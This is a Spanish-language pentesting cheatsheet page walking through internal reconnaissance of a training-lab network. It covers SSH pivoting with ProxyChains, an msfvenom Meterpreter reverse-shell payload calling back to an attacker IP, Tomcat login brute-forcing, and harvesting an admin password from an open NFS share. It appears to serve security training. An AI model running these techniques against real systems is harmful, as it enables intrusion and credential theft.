
# Recopilación de Información Interna

Hemos cubierto mucho terreno hasta ahora:

* Realizamos recopilación de información externa
* Se realizó un escaneo de puertos y servicios externos
* Se enumeraron varios servicios en busca de configuraciones incorrectas y vulnerabilidades conocidas.
* Se enumeraron y atacaron 12 aplicaciones web diferentes; algunas no permitieron el acceso, otras permitieron la lectura de archivos o el acceso a datos confidenciales, y unas pocas provocaron la ejecución remota de código en el servidor web subyacente.
* Conseguimos un punto de apoyo en la red interna con mucho esfuerzo.
* Realizamos looting y movimientos laterales para obtener acceso como un usuario más privilegiado.
* Aumentamos privilegios para ser root en el servidor web.
* Se estableció persistencia mediante el uso de un par de usuario/contraseña y la clave privada `id_rsa` de la cuenta root para un acceso SSH rápido al entorno.

***

## <mark style="color:purple;">Configuración de Pivoting - SSH</mark>

Con una copia del archivo `id_rsa` (clave privada), podemos usar el Port Forwarding SSH junto con [ProxyChains](https://github.com/haad/proxychains) para obtener una visión general de la red interna. Para revisar esta técnica, consulte la sección "[Reenvío dinámico de puertos con SSH y túnel SOCKS](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/port-forwarding.md)".

Podemos usar el siguiente comando para configurar nuestro pivoting SSH mediante Port Forwarding dinámico:

```bash
ssh -D 8081 -i dmz01_key root@10.129.x.x
```

Esto significa que podemos redirigir el tráfico desde nuestro host de ataque a través del puerto `8081` en el objetivo para llegar a los hosts dentro de la subred `172.16.8.0/23` directamente desde nuestro host de ataque.

En nuestra primera terminal, configuremos primero el comando de Port Forwarding dinámico con SSH:

```shell-session
afsh4ck@kali$ ssh -D 8081 -i dmz01_key root@10.129.203.111

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Jun 2022 12:08:31 AM UTC

  System load:                      0.21
  Usage of /:                       99.9% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        458
  Users logged in:                  2
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.203.111
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
  IPv4 address for ens192:          172.16.8.120

  => / is using 99.9% of 13.72GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

97 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


You have mail.
Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
root@dmz01:~#
```

Podemos confirmar que el Port Forwarding dinámico está configurado usando `Netstat` o ejecutando un escaneo Nmap contra nuestra dirección de localhost.

```shell-session
afsh4ck@kali$ netstat -antp | grep 8081

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      122808/ssh          
tcp6       0      0 ::1:8081
```

A continuación, debemos modificar el archivo `/etc/proxychains.conf` para utilizar el puerto que especificamos con nuestro comando de reenvío de puerto dinámico (8081 aquí).

```shell-session
afsh4ck@kali$ grep socks4 /etc/proxychains4.conf 

#	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

A continuación, podemos usar Nmap con Proxychains para escanear el host `dmz01` en su segunda NIC, con la dirección IP `172.16.8.120` para asegurarnos de que todo esté configurado correctamente.

```shell-session
afsh4ck@kali$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
Nmap scan report for 172.16.8.120
Host is up (0.13s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

***

## <mark style="color:purple;">Configuración de Pivoting - Metasploit</mark>

Como alternativa, podemos configurar nuestro pivoting con Metasploit, como se explica en la sección "[Meterpreter Tunnelling & Port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/meterpreter-tunneling-and-port-forwarding.md)". Para ello, podemos hacer lo siguiente:

Primero, genera un reverse shell en formato Elf (ejecutable en linux) usando `msfvenom`:

```shell-session
afsh4ck@kali$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

A continuación, transfiere el binario al destino. Como tenemos SSH, podemos subirlo al destino mediante SCP.

```shell-session
afsh4ck@kali$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp

shell.elf                                                                      100%  207     1.6KB/s   00:00
```

Ahora, configuraremos en Metasploit un listener  `multi/handler`.

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> use exploit/multi/handler
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.15.248
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.15.248:443
```

Ejecutamos el archivo  `shell.elf` en el sistema de destino:

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

Si todo va según lo previsto, capturaremos el shell de Meterpreter mediante el multi/handler y luego podremos configurar las rutas.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 10.10.15.248:443 
[*] Sending stage (1017704 bytes) to 10.129.2.103
[*] Meterpreter session 1 opened (10.10.15.248:443 -> 10.129.2.103:39684) at 2025-04-10 20:36:38 +0200

meterpreter > getuid
Server username: root
```

<figure><img src="/files/B3oCTu8Y2gzxRDljTMj3" alt=""><figcaption></figcaption></figure>

A continuación, podemos configurar el enrutamiento utilizando el módulo `post/multi/manage/autoroute`.

```
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> show options 

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                       fault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

Para refrescar la memoria, consulte la sección [MSFvenom](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom.md) y la sección [Metasploit](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/metasploit.md).

***

## <mark style="color:purple;">Host Discovery - Metasploit</mark>

Una vez configuradas ambas opciones, podemos empezar a buscar hosts activos. Usando nuestra sesión de Meterpreter, podemos usar el módulo `multi/gather/ping_sweep` para realizar un barrido de ping de la subred `172.16.8.0/23`.

```shell-session
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

***

## <mark style="color:purple;">Host Discovery - Ping Sweep con bucle for</mark>

Como alternativa, podríamos hacer un Ping Sweep o utilizar un [binario Nmap estático](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) desde el host `dmz01`.

Obtenemos resultados rápidos con este barrido de ping one-liner de Bash:

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

También podríamos usar Nmap a través de Proxychains para enumerar los hosts en la subred 172.16.8.0/23, pero sería muy lento y tardaría mucho tiempo en finalizar.

Nuestro host discovery produce tres hosts adicionales, ya que la `dmz01` tiene la ip `172.16.8.120`:

* `172.16.8.3`
* `172.16.8.20`
* `172.16.8.50`

Ahora podemos profundizar en cada uno de estos hosts y ver qué descubrimos. Los guardamos en un archivo `live_hosts` para pasárselo a otras herramientas como nmap.

***

## <mark style="color:purple;">Enumeración de hosts</mark>

Continuemos nuestra enumeración usando un [binario estático de Nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) en el host `dmz01`. Intenta cargar el binario usando una de las técnicas enseñadas en el módulo [File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md). Vemos una más abajo en el [caso práctico](#caso-practico).

```shell-session
root@dmz01:/tmp# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
Unable to find nmap-services! Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

De la salida de Nmap, podemos obtener lo siguiente:

* `172.16.8.3` es un controlador de dominio porque vemos puertos abiertos como Kerberos y LDAP. Probablemente podamos dejar esto de lado por ahora, ya que es improbable que sea directamente explotable (aunque podemos retomarlo más adelante).
* `172.16.8.20` es un host de Windows y los puertos `80/HTTP` y `2049/NFS` son particularmente interesantes
* `172.16.8.50` también es un host de Windows, y el puerto `8080` se destaca por no ser estándar y ser interesante.

Podríamos ejecutar un escaneo completo del puerto TCP en segundo plano mientras investigamos algunos de estos hosts.

***

## <mark style="color:purple;">Guía rápida de Active Directory</mark>

### SMB Null Session

Podemos comprobar rápidamente si el controlador de dominio tiene sesiones SMB nulas. Si podemos obtener la política de contraseñas y una lista de usuarios, podríamos intentar un ataque de Password Spraying medido. Si conocemos la política de contraseñas, podemos programar nuestros ataques adecuadamente para evitar el bloqueo de cuentas. Si no encontramos nada más, podríamos volver atrás y usar `Kerbrute` con una lista de nombres de usuario válidos, tras enumerar (durante una prueba de penetración real), los nombres de usuario potenciales de la página de LinkedIn de la empresa. Con esta lista, podríamos intentar uno o dos ataques de Password Spraying con la esperanza de obtener un resultado. Si esto sigue sin funcionar, dependiendo del cliente y el tipo de evaluación, podríamos solicitarles la política de contraseñas para evitar el bloqueo de cuentas.&#x20;

También podríamos intentar un ataque ASREPRoasting si tenemos nombres de usuario válidos, como se explica en el módulo "[Malas configuraciones en AD](/ethical-hacking-cheatsheet/active-directory/active-directory/malas-configuraciones-en-ad.md)" en la sección ASREP Roasting.

```shell-session
afsh4ck@kali$ proxychains enum4linux -U -P 172.16.8.3

ProxyChains-3.1 (http://proxychains.sf.net)
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ================================================== 
|    Enumerating Workgroup/Domain on 172.16.8.3    |
 ================================================== 
[E] Can't find workgroup/domain

 =================================== 
|    Session Check on 172.16.8.3    |
 =================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 172.16.8.3 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================= 
|    Getting domain SID for 172.16.8.3    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
Domain Name: INLANEFREIGHT
Domain Sid: S-1-5-21-2814148634-3729814499-1637837074
[+] Host is part of a domain (not a workgroup)

 =========================== 
|    Users on 172.16.8.3    |
 =========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ================================================== 
|    Password Policy Information for 172.16.8.3    |
 ================================================== 
[E] Unexpected error from polenum:
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:139-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK


[+] Attaching to 172.16.8.3 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.8.3)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient

enum4linux complete on Tue Jun 21 21:50:07 2022
```

Desafortunadamente para nosotros esto es un callejón sin salida.

***

### 172.16.8.50 - Tomcat

Nuestro escaneo anterior de Nmap mostró el puerto 8080 abierto en este host. Al navegar, `http://172.16.8.50:8080` se muestra la última versión de Tomcat 10 instalada. Aunque no existen exploits públicos para ello, podemos intentar forzar el inicio de sesión del administrador de Tomcat, como se muestra en la sección "[Ataques a Tomcat](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-servlet-containers/tomcat-ataques.md)".&#x20;

Podemos iniciar otra instancia de Metasploit usando Proxychains escribiendo `proxychains msfconsole` para poder pivotar a través del host `dmz01` comprometido, si no tenemos configurado el enrutamiento mediante una sesión de Meterpreter. Luego, podemos usar el módulo `auxiliary/scanner/http/tomcat_mgr_login` para intentar forzar el inicio de sesión.

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK

[!] No active DB -- Credential data will not be saved!
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)

<SNIP>

|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

No logramos iniciar sesión correctamente, por lo que esto parece ser un callejón sin salida y no vale la pena explorarlo más. Si encontráramos una página de inicio de sesión de Tomcat Manager expuesta a internet, probablemente querríamos registrarla como un hallazgo, ya que un atacante podría usarla para obtener acceso por fuerza bruta. Durante una operación interna, solo querríamos reportarla si logramos acceder con credenciales débiles y subir un webshell JSP. De lo contrario, es normal verla en una red interna si está bien protegida.

***

### Enumeración de 172.16.8.20 - DotNetNuke (DNN)

En el análisis de Nmap, vimos puertos `80` y `2049` abiertos. Analicemos cada uno de ellos. Podemos comprobar qué hay en el puerto 80 con `cURL` desde nuestro host de ataque con el comando `proxychains curl http://172.16.8.20`. Según la respuesta HTTP, parece que [DotNetNuke (DNN)](https://www.dnnsoftware.com/) se está ejecutando en el objetivo.&#x20;

Este es un CMS escrito en .NET, básicamente el WordPress de .NET. Ha sufrido algunas fallas críticas a lo largo de los años y también cuenta con algunas funciones integradas que podríamos aprovechar. Podemos confirmarlo navegando directamente al objetivo desde nuestro host de ataque, pasando el tráfico a través del proxy SOCKS.

Podemos configurar esto en Firefox de la siguiente manera en `Network Settings`:

<figure><img src="/files/lzGcOOGnsIVonv5LF1iu" alt=""><figcaption></figcaption></figure>

Navegando por la página se confirman nuestras sospechas.

![texto](https://academy.hackthebox.com/storage/modules/163/dnn_homepage.png)

Al navegar a `http://172.16.8.20/Login?returnurl=%2fadmin` se muestra la página de inicio de sesión del administrador. También hay una página para registrar un usuario. Intentamos registrar una cuenta, pero recibimos el siguiente mensaje:

{% code overflow="wrap" %}

```
An email with your details has been sent to the Site Administrator for verification. You will be notified by email when your registration has been approved. In the meantime you can continue to browse this site.
```

{% endcode %}

En mi experiencia, es muy poco probable que cualquier tipo de administrador de sitio apruebe un registro extraño, aunque vale la pena intentar cubrir todas nuestras bases.

Dejando de lado el DNN, por ahora, volvamos a los resultados del escaneo de puertos. El puerto 2049, NFS, siempre es interesante. Si el servidor NFS está mal configurado (lo cual suele ocurrir internamente), podemos explorar los recursos compartidos NFS y potencialmente descubrir información confidencial. Dado que se trata de un servidor de desarrollo (debido a la instalación del DNN en curso y al nombre de host `DEV01`), vale la pena investigarlo. Podemos usar ["showmount"](https://linux.die.net/man/8/showmount) para listar las exportaciones, que podríamos montar y explorar de forma similar a cualquier otro recurso compartido de archivos. Encontramos una exportación, `DEV01`, accesible para todos (acceso anónimo). Veamos qué contiene.

```shell-session
afsh4ck@kali$ proxychains showmount -e 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

No podemos montar el recurso compartido NFS mediante Proxychains, pero por suerte tenemos acceso root al host dmz01 para intentarlo. Vemos algunos archivos relacionados con DNN y un subdirectorio `DNN`.

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml     
```

El subdirectorio `DNN` es muy interesante, ya que contiene un archivo `web.config`. Gracias a nuestras conversaciones sobre el [pillaging](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/varias-tecnicas-de-escalada-en-windows/pillaging.md), sabemos que los archivos de configuración suelen contener credenciales, lo que los convierte en un objetivo clave durante cualquier evaluación.

```shell-session
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root@dmz01:/tmp/DEV01/DNN# 
```

Al verificar el contenido del archivo `web.config`, encontramos lo que parece ser la contraseña de administrador para la instancia DNN.

```shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Antes de continuar, dado que tenemos acceso root `dmz01` por SSH, podemos ejecutar `tcpdump` tal y como está en el sistema. Nunca está de más escuchar en la red siempre que sea posible durante una prueba de penetración para ver si podemos obtener credenciales en texto plano o, en general, descubrir información adicional que pueda sernos útil. Normalmente lo hacemos durante una prueba de penetración interna, cuando tenemos nuestro propio portátil físico o una máquina virtual que controlamos dentro de la red del cliente. Algunos pentesters ejecutan una captura de paquetes constantemente (en raras ocasiones, los clientes incluso la solicitan), mientras que otros la ejecutan periódicamente durante el primer día aproximadamente para ver si pueden capturar algo.

```shell-session
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```

Ahora podríamos transferir esto a nuestro host y abrirlo con `Wireshark` para ver si pudimos capturar algo. Esto se explica brevemente en la sección "[Interacción con usuarios](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/varias-tecnicas-de-escalada-en-windows/interaccion-con-usuarios.md)" del módulo [`Escalada de privilegios en Windows`](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows.md).

Tras transferir el archivo a nuestro host, lo abrimos en Wireshark, pero observamos que no se capturó nada. Si estuviéramos en una VLAN de usuario u otra zona concurrida de la red, podríamos tener que analizar una cantidad considerable de datos, así que siempre vale la pena intentarlo.

***

### Hacia delante

En este punto, hemos investigado los demás hosts activos a los que podemos acceder e intentado rastrear el tráfico de red. Podríamos ejecutar un escaneo completo de puertos de estos hosts también, pero tenemos mucho que hacer por ahora. Veamos qué podemos hacer con las credenciales DNN que obtuvimos del archivo `web.config` extraído del recurso compartido NFS abierto.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

> Monta un recurso compartido NFS y busque el archivo `flag.txt`. Envíe el contenido como respuesta.

### Port Forwarding con ID RSA

Tenemos que editar el archivo de proxychains para añadir un puerto en localhost:

```bash
afsh4ck@kali$ sudo nano /etc/proxychains4.conf 

#	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

```shell-session
afsh4ck@kali$ chmod 600 dmz01_key                          

afsh4ck@kali$ ssh -D 8081 -i dmz01_key root@10.129.229.147
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 09 Apr 2025 07:12:06 PM UTC
  Last login: Fri Mar  8 09:55:50 2024
                                                                                                                                                                 root@dmz01:~# 
root@dmz01:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Confirmar Port Forwarding dinámico

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$  netstat -antp | grep 8081
</strong><strong>
</strong>(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      206787/ssh          
tcp6       0      0 ::1:8081                :::*                    LISTEN      206787/ssh    
</code></pre>

***

### Localizar la red interna

Con un ifconfig conseguimos la ip interna `172.16.8.120`.

```shell-session
root@dmz01:~# ifconfig
br-65c448355ed2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:6aff:febc:f2d3  prefixlen 64  scopeid 0x20<link>
        ether 02:42:6a:bc:f2:d3  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11  bytes 1130 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.147  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe94:e13a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:e13a  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:e1:3a  txqueuelen 1000  (Ethernet)
        RX packets 29047  bytes 2032253 (2.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4233  bytes 736045 (736.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:fe94:68b2  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:68:b2  txqueuelen 1000  (Ethernet)
        RX packets 1467  bytes 96895 (96.8 KB)
        RX errors 0  dropped 20  overruns 0  frame 0
        TX packets 58  bytes 4996 (4.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

***

### Ping Sweep de la red interna

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=3.20 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=1.99 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=2.34 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.034 ms
```

Estos hosts los guardamos en un archivo targets:

<pre class="language-bash"><code class="lang-bash"><strong>echo -e '172.16.8.3\n172.16.8.20\n172.16.8.50' > targets
</strong></code></pre>

***

### Enumeración de hosts con Nmap

Vamos a enviar a la máquina un binario de Nmap para ejecutarlo desde la red interna:

{% embed url="<https://github.com/andrew-d/static-binaries>" %}

```shell-session
afsh4ck@kali$ git clone https://github.com/andrew-d/static-binaries.git
afsh4ck@kali$ cd static-binaries/binaries/linux/x86_64

afsh4ck@kali$ python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell-session
root@dmz01:~# wget http://10.10.15.248/nmap
--2025-04-09 19:28:04--  http://10.10.15.248/nmap
